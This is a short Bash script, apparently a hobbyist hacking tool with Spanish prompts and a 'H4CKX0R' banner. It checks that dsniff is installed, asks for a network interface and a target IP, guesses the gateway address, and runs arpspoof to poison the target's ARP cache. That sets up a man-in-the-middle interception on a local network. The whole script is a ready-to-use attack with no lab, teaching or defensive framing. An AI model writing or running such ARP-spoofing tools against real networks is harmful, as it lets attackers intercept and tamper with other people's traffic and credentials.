#!/bin/bash
echo -e "\033[93mCreado por H4CKX0R\033[0m"
cat << "EOF"
|  _ \              \		      /
| |_)|		     \		     /     _____
|   _/	\  / ______   \     / \     /   *   |     *
|  _ \	 \/  |    |    \    / \    /    |   |__   |
| |_)|	 /   | ----	\  /   \  /     |   |     |
|___/   /    |_____	 \/     \/      |   |     |

EOF
detectar_herramienta(){
	if ! [ -x "$(command -v $1)" ]; then
		echo "Error: $1 no esta instalado. Por favor, instalalo y vuelve a intentar de nuevo." >&2
		exit 1
     	fi
}

detectar_herramienta "dsniff"

read -p "Ingrese su interfaz de red: " interfaz
read -p "Ingrese la IP objetivo: " ip
ip_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$ip_enlace"
